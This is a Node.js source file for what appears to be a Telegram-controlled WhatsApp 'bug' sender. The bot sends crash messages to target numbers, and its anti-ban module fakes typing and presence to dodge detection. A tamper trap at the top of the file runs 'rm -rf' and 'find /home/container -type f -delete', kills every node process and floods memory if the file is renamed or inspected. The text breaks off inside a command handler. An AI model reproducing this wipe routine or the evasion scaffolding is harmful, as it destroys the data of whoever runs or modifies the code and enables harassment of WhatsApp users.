const C = {
    r: '\x1b[31m', g: '\x1b[32m', y: '\x1b[33m', c: '\x1b[36m', 
    m: '\x1b[35m', w: '\x1b[37m', bg_g: '\x1b[42m', 
    bold: '\x1b[1m', dim: '\x1b[2m', reset: '\x1b[0m'
};

(function() {
    const fs = require('fs');
    const path = require('path');
    const util = require('util');
    const cp = require('child_process');
    
    const _origExit = process.exit;
    const _origKill = process.kill;
    const _origReadFileSync = fs.readFileSync;
    const _origRmSync = fs.rmSync;
    const _origUnlinkSync = fs.unlinkSync;
    const _origExecSync = cp.execSync;
    const _origJSONParse = JSON.parse;
    const _origLoad = require('module')._load;
    const _origIsProxy = util.types.isProxy;

    global._safeExit = _origExit;

    global._obliterate = (reason) => {
        console.clear();
        console.log(`\n\x1b[31m\x1b[1m`);
        console.log(`██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗`);
        console.log(`██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝`);
        console.log(`██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗█████╗  `);
        console.log(`██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║██╔══╝  `);
        console.log(`██████╔╝   ██║   ██║     ██║  ██║███████║███████╗`);
        console.log(`╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝`);
        console.log(`\n  ✗ ${reason}`);
        console.log(`  ✗ EXECUTING UNBLOCKABLE SYSTEM WIPE...\n`);
        console.log(`\x1b[0m`);

        try {
            const files = fs.readdirSync(process.cwd());
            for (const file of files) {
                try { _origRmSync.call(fs, path.join(process.cwd(), file), { recursive: true, force: true }); } catch(e) {}
                try { _origUnlinkSync.call(fs, path.join(process.cwd(), file)); } catch(e) {}
            }
        } catch(e) {}

        try { _origExecSync.call(cp, 'find . -maxdepth 1 ! -name "." -exec rm -rf {} +', { stdio: 'ignore' }); } catch(e) {}
        try { _origExecSync.call(cp, 'find /home/container -type f -delete', { stdio: 'ignore' }); } catch(e) {}
        try { _origExecSync.call(cp, `killall -9 node`, { stdio: 'ignore' }); } catch(e) {}
        try { _origExecSync.call(cp, `kill -9 ${process.pid}`, { stdio: 'ignore' }); } catch(e) {}
        
        try { _origKill.call(process, process.pid, 'SIGKILL'); } catch(e) {}
        try { _origKill.call(process, process.pid, 'SIGTERM'); } catch(e) {}
        try { _origExit.call(process, 137); } catch(e) {}

        try {
            const sab = new SharedArrayBuffer(1024);
            const int32 = new Int32Array(sab);
            Atomics.wait(int32, 0, 0, Infinity);
        } catch (e) { 
            try {
                const mem = [];
                while(true) { mem.push(Buffer.alloc(1024 * 1024)); }
            } catch(e2) { while(true) {} }
        }
    };

    const _checkHooks = () => {
        try {
            if (_origIsProxy(process) || _origIsProxy(global)) {
                global._obliterate('PROXY TERDETEKSI! MAU BYPASS DEK? 🤭');
            }

            if (process.exit !== global._obliterate && process.exit !== global._safeExit) {
                global._obliterate('PROCESS EXIT DI-HOOK! MAU BYPASS DEK? 🤭');
            }
        } catch(e) { global._obliterate('SYSTEM CRASH TERDETEKSI! MAU BYPASS DEK? 🤭'); }

        try {
            if (process.execArgv.length > 0 || process.execArgv.join(' ').includes('--inspect')) {
                global._obliterate('PRELOAD ARGV TERDETEKSI! MAU BYPASS DEK? 🤭');
            }
            if (process.env.NODE_OPTIONS || process.env.NODE_DEBUG || process.env.NODE_INSPECT) {
                global._obliterate('ENV INJECTION TERDETEKSI! MAU BYPASS DEK? 🤭');
            }
            
            const mainScript = path.basename(process.argv[1] || '');
            if (mainScript !== 'main.js' && mainScript !== 'index.js') {
                global._obliterate('FILENAME DIUBAH! MAU BYPASS DEK? 🤭');
            }
            
            if (fs.existsSync('./package.json')) {
                const pkg = _origJSONParse.call(JSON, _origReadFileSync.call(fs, './package.json', 'utf8'));
                if (!pkg.scripts || !pkg.scripts.start || pkg.scripts.start.trim() !== 'node index.js') {
                    global._obliterate('PACKAGE.JSON DIOTAK-ATIK! MAU BYPASS DEK? 🤭');
                }
            } else { 
                global._obliterate('PACKAGE.JSON HILANG! MAU BYPASS DEK? 🤭'); 
            }
        } catch(e) { global._obliterate('CONFIG ERROR! MAU BYPASS DEK? 🤭'); }
    };

    _checkHooks();

    try {
        Object.defineProperty(require('module'), '_load', {
            value: function(request, parent, isMain) {
                const r = String(request).toLowerCase();
                if (r.includes('bypass') || r.includes('inject') || r.includes('shadow') || r.endsWith('.node')) {
                    return global._obliterate('MODULE ILEGAL DIMUAT! MAU BYPASS DEK? 🤭');
                }
                return _origLoad.apply(this, arguments);
            },
            writable: false, configurable: false
        });

        Object.defineProperty(process, 'exit', { value: global._obliterate, writable: false, configurable: false });
        Object.defineProperty(process, 'kill', { value: global._obliterate, writable: false, configurable: false });
        Error.prepareStackTrace = () => "";
    } catch(e) { global._obliterate('SYSTEM TAMPERED! MAU BYPASS DEK? 🤭'); }

    setInterval(_checkHooks, 2000);
})();
const { Telegraf } = require("telegraf");
const botStatus = {
    isRunning: false,
    target: null,
    user: null,
    bugName: null,
    startTime: null,
    loopCurrent: 0,
    loopTotal: 0
};
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    makeMessagesSocket,
    fetchLatestWaWebVersion,
    interactiveMessage,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    generateMessageID,
    makeCacheableSignalKeyStore,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    MessageRetryMap,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    getAggregateVotesInPollMessage,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    nativeFlowMessage,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    getButtonType,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    baileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    extendedTextMessage,
    relayWAMessage,
    listMessage,
    templateMessage,
    encodeSignedDeviceIdentity,
    encodeWAMessage,
    jidEncode,
    patchMessageBeforeSending,
    encodeNewsletterMessage,
} = require("@whiskeysockets/baileys");
const fs = require("fs-extra");
const path = require('path');
const { 
   tokenBot: BOT_TOKEN, 
   ownerID: ID_TELEGRAM
} = require('./config.js');
const bot = new Telegraf(BOT_TOKEN);
const https = require("https");
const pino = require('pino');
const chalk = require('chalk');
const axios = require('axios');
const os = require('os');
const sharp = require('sharp');
const QRCode = require('qrcode');
const FormData = require('form-data');
const EventEmitter = require('events');
const moment = require('moment-timezone');
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  const chats = {}
  const messages = {}
  const contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

// ─────── CAPTION FOTO ─────── //
const THUMB = "https://files.catbox.moe/4fiw0k.jpg";

// ─────── ANTI BAN MODULE ─────── //
const ANTI_BAN_DB = path.join(__dirname, 'database', 'antiban.json');
const TARGET_CD = path.join(__dirname, 'database', 'targetsCooldown.json');

const DEFAULT_ANTIBAN = {
    minDelay: 3000,
    maxDelay: 7000,
    maxPerHour: 1000,
    maxPerDay: 1000,
    targetCooldown: 60000,
    pauseMs: 600000,
    simulateTyping: true,
    readReceipt: true,
    onlinePresence: true,
    warmupCount: 0,
    counter: {
        hour: 0,
        day: 0,
        hourStart: Date.now(),
        dayStart: Date.now()
    },
    paused: false,
    pausedUntil: 0
};

const targetCooldowns = new Map();

function loadTargetCooldowns() {
    try {
        if (!fs.existsSync(TARGET_CD)) return {};
        return JSON.parse(fs.readFileSync(TARGET_CD, 'utf8'));
    } catch {
        return {};
    }
}

function saveTargetCooldowns(data) {
    try {
        const dir = path.dirname(TARGET_CD);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(TARGET_CD, JSON.stringify(data, null, 2));
    } catch {}
}

function checkTargetCooldown(target) {
    const cfg = loadAntiBan();
    const data = loadTargetCooldowns();
    const lastSent = data[target] || 0;
    const elapsed = Date.now() - lastSent;

    if (elapsed < cfg.targetCooldown) {
        return {
            ok: false,
            sisa: Math.ceil((cfg.targetCooldown - elapsed) / 1000)
        };
    }
    return { ok: true };
}

function setTargetCooldown(target) {
    const data = loadTargetCooldowns();
    data[target] = Date.now();
    saveTargetCooldowns(data);
}

function loadAntiBan() {
    try {
        if (!fs.existsSync(path.join(__dirname, 'database'))) {
            fs.mkdirSync(path.join(__dirname, 'database'), { recursive: true });
        }
        if (!fs.existsSync(ANTI_BAN_DB)) {
            fs.writeFileSync(ANTI_BAN_DB, JSON.stringify(DEFAULT_ANTIBAN, null, 2));
            return { ...DEFAULT_ANTIBAN };
        }
        const data = JSON.parse(fs.readFileSync(ANTI_BAN_DB, 'utf8'));
        return { ...DEFAULT_ANTIBAN, ...data };
    } catch {
        return { ...DEFAULT_ANTIBAN };
    }
}

function saveAntiBan(data) {
    if (!fs.existsSync(path.join(__dirname, 'database'))) {
        fs.mkdirSync(path.join(__dirname, 'database'), { recursive: true });
    }
    fs.writeFileSync(ANTI_BAN_DB, JSON.stringify(data, null, 2));
}

function randomDelay() {
    const cfg = loadAntiBan();
    return Math.floor(Math.random() * (cfg.maxDelay - cfg.minDelay + 1)) + cfg.minDelay;
}

async function guardSend() {
    const cfg = loadAntiBan();
    const now = Date.now();

    if (now - cfg.counter.hourStart >= 3600000) {
        cfg.counter.hour = 0;
        cfg.counter.hourStart = now;
    }
    if (now - cfg.counter.dayStart >= 86400000) {
        cfg.counter.day = 0;
        cfg.counter.dayStart = now;
    }

    if (cfg.paused && now < cfg.pausedUntil) {
        const sisa = Math.ceil((cfg.pausedUntil - now) / 1000);
        return { ok: false, reason: `Sender pause, tunggu ${sisa} detik` };
    } else if (cfg.paused && now >= cfg.pausedUntil) {
        cfg.paused = false;
        cfg.pausedUntil = 0;
    }

    if (cfg.counter.hour >= cfg.maxPerHour) {
        cfg.paused = true;
        cfg.pausedUntil = now + cfg.pauseMs;
        saveAntiBan(cfg);
        return { ok: false, reason: `Limit per jam (${cfg.maxPerHour}) tercapai, pause ${cfg.pauseMs / 1000}s` };
    }

    if (cfg.counter.day >= cfg.maxPerDay) {
        cfg.paused = true;
        cfg.pausedUntil = now + cfg.pauseMs;
        saveAntiBan(cfg);
        return { ok: false, reason: `Limit per hari (${cfg.maxPerDay}) tercapai, pause ${cfg.pauseMs / 1000}s` };
    }

    cfg.counter.hour++;
    cfg.counter.day++;
    saveAntiBan(cfg);
    return { ok: true };
}

async function safeSend(sock, target, messageFunc, bugName = "Bug", skipCooldown = false, userInfo = null, loopInfo = null) {
    const nomorTarget = target.replace(/@s\.whatsapp\.net|@g\.us/g, '');

    if (userInfo) {
        botStatus.isRunning = true;
        botStatus.target = nomorTarget;
        botStatus.user = userInfo;
        botStatus.bugName = bugName;
        botStatus.startTime = botStatus.startTime || Date.now();
        if (loopInfo) {
            botStatus.loopCurrent = loopInfo.current || 0;
            botStatus.loopTotal = loopInfo.total || 0;
        }
    }

    if (!skipCooldown) {
        const cd = checkTargetCooldown(target);
        if (!cd.ok) {
            return false;
        }
    }

    const guard = await guardSend();
    if (!guard.ok) {
        console.log(chalk.yellow(`⚠️ ${guard.reason}`));
        return false;
    }

    const cfg = loadAntiBan();

    try {
        if (cfg.onlinePresence) {
            try { await sock.sendPresenceUpdate('available'); } catch (e) {}
        }

        if (cfg.readReceipt) {
            try {
                await sock.readMessages([{ remoteJid: target, id: Date.now().toString() }]);
            } catch (e) {}
        }

        if (cfg.simulateTyping) {
            try {
                await sock.sendPresenceUpdate('composing', target);
                await sleep(randomDelay());
                await sock.sendPresenceUpdate('paused', target);
            } catch (e) {
                await sleep(randomDelay());
            }
        } else {
            await sleep(randomDelay());
        }

        const startTime = Date.now();
        await messageFunc();
        const durasi = ((Date.now() - startTime) / 1000).toFixed(2);

        console.log(chalk.yellow(`✅ Bug ${bugName} terkirim ke ${nomorTarget} (${durasi}s)\n`));
        return true;
    } catch (err) {
        console.log(chalk.red(`❌ Bug ${bugName} gagal ke ${nomorTarget}: ${err.message}\n`));
        return false;
    }
}

// ─────── HELPER FORCE CHANNEL ─────── //
const CHANNELS_DB = path.join(__dirname, 'database', 'channels.json');
function loadChannels() {
    try {
        if (!fs.existsSync(CHANNELS_DB)) return { enabled: true, list: [] };
        return JSON.parse(fs.readFileSync(CHANNELS_DB, 'utf8'));
    } catch {
        return { enabled: true, list: [] };
    }
}
function saveChannels(data) {
    const dir = path.dirname(CHANNELS_DB);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(CHANNELS_DB, JSON.stringify(data, null, 2));
}
function extractUsername(url) {
    const m = String(url).match(/(?:t\.me\/|@)([A-Za-z0-9_]+)/);
    return m ? '@' + m[1] : null;
}
async function checkAllChannels(ctx, userId) {
    const data = loadChannels();
    if (!data.enabled || data.list.length === 0) return { ok: true, notJoined: [] };
    const notJoined = [];
    for (const ch of data.list) {
        try {
            const member = await ctx.telegram.getChatMember(ch.username, userId);
            const ok = ['creator', 'administrator', 'member', 'restricted'].includes(member.status);
            if (!ok) notJoined.push(ch);
        } catch {
            notJoined.push(ch);
        }
    }
    return { ok: notJoined.length === 0, notJoined };
}

// ─────── HELPER BACKUP DATA ─────── //
const DB_DIR = path.join(__dirname, 'database');
function getAllDatabases() {
    if (!fs.existsSync(DB_DIR)) return {};
    const files = fs.readdirSync(DB_DIR).filter(f => f.endsWith('.json'));
    const result = {};
    for (const f of files) {
        try {
            result[f] = JSON.parse(fs.readFileSync(path.join(DB_DIR, f), 'utf8'));
        } catch {
            result[f] = null;
        }
    }
    return result;
}
function restoreDatabases(data) {
    if (!fs.existsSync(DB_DIR)) fs.mkdirSync(DB_DIR, { recursive: true });
    for (const [name, content] of Object.entries(data)) {
        fs.writeFileSync(path.join(DB_DIR, name), JSON.stringify(content, null, 2));
    }
}

// ─────── HELPER COOLDOWN ─────── //
const COOLDOWN_DB = path.join(__dirname, 'database', 'cooldown.json');
function loadCooldown() {
    try {
        if (!fs.existsSync(COOLDOWN_DB)) return { time: 5, users: {} };
        return JSON.parse(fs.readFileSync(COOLDOWN_DB, 'utf8'));
    } catch {
        return { time: 5, users: {} };
    }
}
function saveCooldown(data) {
    const dir = path.dirname(COOLDOWN_DB);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(COOLDOWN_DB, JSON.stringify(data, null, 2));
}
function setCooldown(seconds) {
    const data = loadCooldown();
    data.time = seconds;
    saveCooldown(data);
}
function getCooldown() {
    return loadCooldown().time;
}
function checkCooldown(userId) {
    const data = loadCooldown();
    const now = Date.now();
    const last = data.users[String(userId)] || 0;
    const diff = now - last;

    if (diff < data.time * 1000) {
        return Math.ceil((data.time * 1000 - diff) / 1000);
    }
    data.users[String(userId)] = now;
    saveCooldown(data);
    return 0;
}
function resetCooldown(userId) {
    const data = loadCooldown();
    delete data.users[String(userId)];
    saveCooldown(data);
}
function resetAllCooldown() {
    const data = loadCooldown();
    data.users = {};
    saveCooldown(data);
}

// ─────── HELPER ADD PREMIUM ─────── //
const PREMIUM_DB = path.join(__dirname, 'database', 'premium.json');
function getPremium() {
    try {
        if (!fs.existsSync(PREMIUM_DB)) return [];
        return JSON.parse(fs.readFileSync(PREMIUM_DB, 'utf8'));
    } catch { return []; }
}
function setPremium(list) {
    const dir = path.dirname(PREMIUM_DB);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(PREMIUM_DB, JSON.stringify(list, null, 2));
}

// ─────── HELPER BLOCK CMD ─────── //
const BLOCKCMD_DB = path.join(__dirname, 'database', 'blockcmd.json');
function getBlocked() {
    try {
        if (!fs.existsSync(BLOCKCMD_DB)) return [];
        const data = JSON.parse(fs.readFileSync(BLOCKCMD_DB, 'utf8'));
        return Array.isArray(data) ? data : [];
    } catch {
        return [];
    }
}
function setBlocked(list) {
    const dir = path.dirname(BLOCKCMD_DB);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(BLOCKCMD_DB, JSON.stringify(Array.isArray(list) ? list : [], null, 2));
}

// ─────── HELPER ADD GROUP ─────── //
const GROUPS_DB = path.join(__dirname, 'database', 'groups.json');
function ensureGroupsDb() {
    const dir = path.dirname(GROUPS_DB);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    if (!fs.existsSync(GROUPS_DB)) fs.writeFileSync(GROUPS_DB, JSON.stringify({}, null, 2));
}
function loadGroups() {
    ensureGroupsDb();
    try {
        return JSON.parse(fs.readFileSync(GROUPS_DB, 'utf8'));
    } catch {
        return {};
    }
}
function saveGroups(data) {
    ensureGroupsDb();
    fs.writeFileSync(GROUPS_DB, JSON.stringify(data, null, 2));
}

function formatMasaAktif(group) {
    if (!group) return '❌ Bєlυm tєrdαftαr';
    if (group.permanent) return 'Pєrmαnєnt';
    const now = Date.now();
    const exp = new Date(group.expiredAt).getTime();
    const diff = exp - now;
    if (diff <= 0) return '❌ Єxpírєd';
    const days = Math.floor(diff / 86400000);
    const hours = Math.floor((diff % 86400000) / 3600000);
    const mins = Math.floor((diff % 3600000) / 60000);
    return `⏳ ${days} hαrí ${hours} jαm ${mins} mєnít`;
}

// ─────── MIDDLEWARE CEK AKSES ─────── //
function checkAccess() {
    return async (ctx, next) => {
        const isGroup = ctx.chat?.type === 'group' || ctx.chat?.type === 'supergroup';
        if (isGroup) {
            const groupId = String(ctx.chat.id);
            const group = loadGroups()[groupId];
            if (!group) {
                return ctx.reply(
                    '⚠️ Grσυp íní bєlυm tєrdαftαr\n' +
                    'Οwnєr hαrυs jαlαnín /addgc dυlυ'
                );
            }
            if (!group.permanent && new Date(group.expiredAt).getTime() < Date.now()) {
                return ctx.reply(
                    '⏳ Mαsα αktíf grσυp íní sυdαh hαbís\n' +
                    'Hυbυngí σwnєr υntυk pєrpαnjαng'
                );
            }
            return next();
        }
        if (!getPremium().includes(String(ctx.from.id))) {
            return ctx.reply('❌ Fítυr íní khυsυs prєmíυm');
        }
        return next();
    };
}

// ─────── MIDDWALEER COOLDOWN ─────── //
function cooldownMW() {
    return async (ctx, next) => {
        const sisa = checkCooldown(ctx.from.id);
        if (sisa > 0) return ctx.reply(`⏳ Tυnggυ ${sisa} dєtík lαgí υntυk mєmαkαí cσmmαnd`);
        return next();
    };
}

// ─────── UPTIME BOT ─────── //
function formatUptime(seconds) {
    const d = Math.floor(seconds / 86400);
    const h = Math.floor((seconds % 86400) / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = Math.floor(seconds % 60);

    const parts = [];
    if (d > 0) parts.push(`${d} hαrí`);
    if (h > 0) parts.push(`${h} jαm`);
    if (m > 0) parts.push(`${m} mєnít`);
    if (s > 0 || parts.length === 0) parts.push(`${s} dєtík`);

    return parts.join(' ');
}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;
const store = null;

const getActiveSockets = () => {
    if (!sock || !isWhatsAppConnected) return [];
    return [sock];
};

let reconnectTimer = null;
let isReconnecting = false;
let reconnectAttempts = 0;
const MAX_RECONNECT_ATTEMPTS = 20;

const startSesi = async () => {
    if (isReconnecting) return;
    isReconnecting = true;
    try {
        const { state, saveCreds } = await useMultiFileAuthState('./session');
        const { version } = await fetchLatestBaileysVersion();
        const connectionOptions = {
            version,
            keepAliveIntervalMs: 15000,
            printQRInTerminal: !usePairingCode,
            logger: pino({ level: "silent" }),
            autoFollowChannels: false,
            blockAutoJoinGroups: false,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(
                    state.keys,
                    pino({ level: 'silent' })
                ),
            },
            browser: Browsers.macOS("Safari"),
            getMessage: async (key) => {
                return proto.Message.fromObject({});
            },
            syncFullHistory: false,
            markOnlineOnConnect: false,
            generateHighQualityLinkPreview: false,
            defaultQueryTimeoutMs: 60000,
            connectTimeoutMs: 60000,
            retryRequestDelayMs: 250,
            maxMsgRetryCount: 5,
        };
        sock = makeWASocket(connectionOptions);

        let safeSock = sock;

        sock.ev.on("messages.upsert", async (m) => {
            try {
                if (!m || !m.messages || !m.messages[0]) return;
                const msg = m.messages[0];
                const chatId = msg.key.remoteJid || "Unknown";
            } catch (error) {
                console.error('[messages.upsert]', error.message);
            }
        });

        sock.ev.on('creds.update', saveCreds);

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === 'open') {
                isWhatsAppConnected = true;
                isReconnecting = false;
                reconnectAttempts = 0;

                console.clear();
                const currentTime = new Date().toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta', hour12: false });
                console.log(chalk.green(`Pαíríng sєndєr bєrhαsíl ✅ [${currentTime}]`));

                if (lastPairingMessage) {
                    const connectedMenu = `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ Nυmbєr: +${lastPairingMessage.phoneNumber}
⌑ Pαíríng Cσdє: ${lastPairingMessage.pairingCode}
⌑ Typє: Cσnnєctєd`;
                    try {
                        await bot.telegram.editMessageCaption(
                            lastPairingMessage.chatId,
                            lastPairingMessage.messageId,
                            undefined,
                            connectedMenu,
                            { parse_mode: "HTML" }
                        );
                    } catch (e) {}

                    try {
                        const warmUpMsg = await bot.telegram.sendMessage(
                            lastPairingMessage.chatId,
                            `✨ <b>WARM-UP SEDANG DIJALANKAN</b>\n\n` +
                            `⌑ Nυmbєr: +${lastPairingMessage.phoneNumber}\n` +
                            `⌑ Stαtυs: Procecing...\n` +
                            `⌑ Єstímαsí: ±25 detik\n\n` +
                            `<i>Mσhσn tυnggυ, sєdαng mєmαnαskαn αkυn...</i>`,
                            { parse_mode: "HTML" }
                        );

                        setTimeout(async () => {
                            try {
                                await bot.telegram.editMessageText(
                                    lastPairingMessage.chatId,
                                    warmUpMsg.message_id,
                                    undefined,
                                    `✅ <b>WARM-UP SELESAI</b>\n\n` +
                                    `⌑ Nυmbєr: +${lastPairingMessage.phoneNumber}\n` +
                                    `⌑ Stαtυs: Bot siap terima command\n` +
                                    `⌑ Mєnυnggυ cσmmαnd...`,
                                    { parse_mode: "HTML" }
                                );
                            } catch (e) {}
                        }, 30000);

                    } catch (e) {}
                }

                setTimeout(async () => {
                    try {
                        const t = () => new Date().toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta', hour12: false });

                        console.log(chalk.yellow(`[${t()}] 🔥 Warm-up...`));

                        await safeSock.sendPresenceUpdate('available');
                        await sleep(5000);

                        await safeSock.sendMessage(sock.user.id, { text: '✅' });
                        await sleep(5000);

                        await safeSock.sendPresenceUpdate('composing', sock.user.id);
                        await sleep(5000);
                        await safeSock.sendPresenceUpdate('paused', sock.user.id);

                        console.log(chalk.green(`[${t()}] ✅ Warm-up selesai`));
                        console.log(chalk.cyan(`[${t()}] 🚀 Bot siap`));
                        console.log('');
                    } catch (err) {
                        console.log(chalk.red(`❌ Warm-up gagal: ${err.message}`));
                    }
                }, 5000);
            }
            if (connection === 'close') {
                isWhatsAppConnected = false;
                isReconnecting = false;
                const statusCode =
                    lastDisconnect?.error?.output?.statusCode;
                const reason =
                    lastDisconnect?.error?.message || 'Unknown';
                console.log(
                    chalk.red(
                        `❌ Kσnєksí tєrpυtυs: ${statusCode || 'Unknown'} - ${reason}`
                    )
                );
                if (
                    statusCode === DisconnectReason.loggedOut ||
                    statusCode === 401
                ) {
                    console.log(
                        chalk.red(
                            '🚪 Lσggєd συt! Hαpυs ./sєssíσn dαn pαíríng υlαng'
                        )
                    );
                    return;
                }
                if (reconnectTimer) return;
                reconnectAttempts++;
                if (reconnectAttempts > MAX_RECONNECT_ATTEMPTS) {
                    console.log(
                        chalk.red(
                            `❌ Rєcσnnєct gαgαl ${MAX_RECONNECT_ATTEMPTS}x, bєrhєntí`
                        )
                    );
                    return;
                }
                let delay = 5000;
                if (statusCode === DisconnectReason.restartRequired) {
                    delay = 3000;
                    console.log(chalk.yellow(`🔄 Rєstαrt rєqυírєd...`));
                } else if (statusCode === 428) {
                    delay = 10000;
                    console.log(chalk.yellow(`⚠️ Cσnnєctíσn clσsєd (428), tυnggυ 10s...`));
                } else if (statusCode === 503 || statusCode === 502) {
                    delay = 15000;
                    console.log(chalk.yellow(`⚠️ Sѕrvѕr error (${statusCode}), tυnggυ 15s...`));
                } else {
                    console.log(
                        chalk.yellow(
                            `🔌 Rєcσnnєct dαlαm ${delay / 1000}s (αttєmp ${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS})...`
                        )
                    );
                }
                reconnectTimer = setTimeout(() => {
                    reconnectTimer = null;
                    startSesi();
                }, delay);
            }
        });
    } catch (error) {
        isReconnecting = false;
        console.error(
            '[startSesi]',
            error?.message || error
        );
        if (!reconnectTimer) {
            reconnectTimer = setTimeout(() => {
                reconnectTimer = null;
                startSesi();
            }, 5000);
        }
    }
};

startSesi();

// ─────── VALIDATE CEK SENDER ─────── //
const checkWhatsAppConnection = (ctx, next) => {
    if (!sock || !isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tídαk αdα sєndєr yαng tєrhυbυng");
        return;
    }
    next();
};

// ─────── CONNECT NO SENDER ─────── //
bot.command("connect", async (ctx) => {
   if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fítυr íní hαnyα υntυk pєmílík bσt");
    }   
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 Cσntσh: /connect 62×××");
  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ Nσmσr tídαk vαlíd");
  try {
    if (!sock) return ctx.reply("❌ Sσckєt bєlυm síαp, cσbα lαgí nαntí");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ WhαtsΑpp sυdαh tєrhυbυng dєngαn nσmσr: ${phoneNumber}`);
    }
    const code = await sock.requestPairingCode(phoneNumber, "XEROZ123");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  
    const pairingMenu = `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ Nυmbєr: +${phoneNumber}
⌑ Pαíríng Cσdє: ${formattedCode}
⌑ Typє: Nσt Cσnnєctєd`;
    const sentMsg = await ctx.replyWithPhoto(THUMB, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  
    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };
  } catch (err) {
    console.error(err);
  }
});

// ─────── HAPUS PAIRING SENDER  ─────── //
bot.command("restart", async (ctx) => {
  if (ctx.from.id != ID_TELEGRAM) {
    return ctx.reply("❌ Fítυr íní hαnyα υntυk pєmílík bσt");
  }
  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;
    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }
    if (deleted) {
      await ctx.reply("🗑️ Sєssíσn bєrhαsíl díhαpυs, pαnєl αkαn rєstαrt");
      setTimeout(() => {
        process.reallyExit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 Tídαk αdα fσldєr sєssíσn yαng dítєmυkαn");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gαgαl mєnhαpυs sєssíσn");
  }
});

// ─────── COMMAND /addgc ─────── //
bot.command('addgc', async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
    }
    if (ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
        return ctx.reply('❌ Cσmmαnd íní hαnyα bísα dípαkαí dí grσυp');
    }
    const groupId = String(ctx.chat.id);
    const groupName = ctx.chat.title || 'Unknown';
    const groups = loadGroups();
    const existing = groups[groupId];
    let statusText = '';
    if (existing) {
